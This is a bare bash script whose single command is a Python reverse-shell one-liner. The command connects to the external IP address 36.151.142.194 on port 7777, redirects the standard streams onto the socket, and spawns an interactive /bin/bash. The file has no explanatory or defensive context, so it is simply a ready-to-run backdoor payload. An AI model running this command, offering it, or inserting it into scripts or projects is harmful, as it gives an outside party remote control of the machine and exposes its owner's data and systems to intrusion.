#!/usr/bin/env bash
python3 -c "import socket,os,pty;s=socket.socket();s.settimeout(10);s.connect(('36.151.142.194',7777));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/bash')"
